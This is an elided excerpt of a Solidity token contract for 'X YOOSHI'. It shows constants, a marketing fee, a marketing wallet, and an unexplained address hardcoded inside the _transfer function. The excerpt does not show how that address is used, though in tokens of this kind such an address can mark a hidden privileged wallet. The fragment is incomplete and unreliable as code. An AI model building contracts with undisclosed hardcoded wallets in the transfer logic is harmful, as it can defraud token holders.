...
contract XYOOSHI is Context, IERC20, Ownable {
    ...
    string private constant _name = "X YOOSHI"; // 
    string private constant _symbol = "X YOOSHI"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x1E15eDF7ef4aCD5a990061a2C4329f2c29167FA0;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0x995856ff8Cfc17F40f3394A08841848bF99Df083;
